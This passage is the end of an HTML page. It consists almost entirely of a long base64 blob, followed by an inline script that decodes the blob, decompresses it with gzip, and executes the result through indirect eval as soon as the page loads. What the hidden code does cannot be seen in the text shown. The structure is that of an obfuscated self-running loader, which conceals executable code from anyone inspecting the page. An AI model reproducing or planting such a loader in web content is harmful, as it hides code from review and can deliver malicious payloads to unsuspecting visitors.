6eKnS2aIY/pTS3TvXTI+5koyDN6w+BRB7FhgoJ1TSXL5Y67VldoIktLr397ch5zhmabqYh/gNurV1IFDNEKkbqVpMvAxqXDW9KguvSGRqvzPTLPhQsDSqSho1QnXFG90V+TVHM6UrUUPma1SG5H2Z4nWx+CoEDMd9HnPw+cFIaI62QgQudBMQnEXElYVmDYybd+pJArnbW3VJUw0aHW7trcwzeIZeJuD7TfzAIhtCib/c+DdvMnBYgPrg9gVFmWP6RMKO57DqnShosm6x/KYD2DzOLZAxPu5Qrdr4OsIr02Ia33J76jxeSAPnJgXdkXUIukBPS96WgqD9/e3FnDJDMzY/gmmKl9A4qyKDrqah3YbNwoMdQButBIqSItt48CB31ZCo9VnO/j6MONxScNka5WC9Gl7v284LkaQ6UobYMLoYf26PpwXhVSAskiTN3B3r7Wb7zj3ZrpodmcWRZTqwrsguao9HpqHoZmJKZuNUBugzZ9uVfEN4osYpcG6dktSJhi7nKSmVMogVNSBg4MczLECq5e/mx0UUoNTVKQArGIM3bv3+23/trWSM39z/OdXvv/33zSfqIx9j96pdD71RBoc3J52PsBxxR3CegrDfBclG72CHkDir7sdc+CGKhoLFLhsGV1palaWsNlPMRZbc6SilYUOVPsJWyXFOKyVI3gH6oJ8ZLm0F+js5b8f1vXAMaScgRriiCawZurXtFURPF1orHuq3oqFd6WOubetGslfya/wrk2nZBeCv6rMYXv3kvrhl2sgufy4I2U2Rbk3R5loU3C+bBGVes3hVGWl1HTLTblqMm1d00p2PWn79ppckAk89JhrqB+nj+iZjbYt/tJKWUCgVPbu0s/mxlya8urLgTnOF3vF8ZVUzcpfPXTipIkv95ub8UUGsdqfvJUsFsbNq5UK7J9W+mZdbrcnfYfNvULvMl7IO1dQnmjmaVEcn1+0bXUZKutr8SHErNQjYeawshf4y4eKeMc2akr061iF/Qm01OQq1O6wBlEFA7cPIlEjOkhjOV5UXokCoKAOaGhzCYBGMUZpj2IR1jgndLI+gAyeo3YF6Ea+N2mpqepMsW6BHbwVRsOCe9Q0IH3i0WToBnYLf8xyino0sSRKY4erFgR41Baw4tbQqbuufLfdpBUB8J+4Qm4otVM5lsdTmtK0AxWXenk3kxaOu92zrRPFdFH5zK5xX/HoCVoGhUVzIUmTd3gaCNUuo2C8ww+0MjE8D1KUnsG6bkZvqeGmSt9YwKn1ujpYmoLUCfpEJbJhy4ioltaoZd/NLgpud3utNJe/TakHvLvqvk/wWL+/YC7nI8G4auUvW5MiiOmsKApRgq2Jv8UED8mySTSYdjtU2IAWqNMwqXH3gr5UgiP7Yp+Z5IumgCzmNT7C38IPseNSLaBhjpRnSYKABV1/vTUXRPyU4nHRb64Ir3v5EAG+CemTxQMzPU9n9KyCN3eR91bfDV6PB1u9CWt866oLnN3B4+E8JGAXECjBVv+CENwSBQzzDq0/8sAtZyiYhGNkZcdGRMUQV781M8dmcF6cQlhNXU+2T42dsCcilxGX0FL0z5kEL2rozdGjA2j1VDrcoIxR2EgG8ZrcBqGN0oA3sKiw+qD/JEGWMFywBNZXlL5PEJlfgiwaHEpsRoAMMdhaAuIzx4ueP0mDsIRQQL08CcsS/pGDXBxinMbd31JtsfiVA68pErE4YbC2Mp+0SFT2sVRhP68KOZkB7GfEuOp9Y28P5LdH8jiSQzhbUnyTu+OoEa2kl921SN0tBDzBJXsW1ONdS7U79xc2Wqbe3G3PfqjbxHZODa/8/rYOZDY1DAAA=";const a=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));const code=await new Response(new Blob([a]).stream().pipeThrough(new DecompressionStream("gzip"))).text();(0,eval)(code);})();</script>
 </body>
 </html>
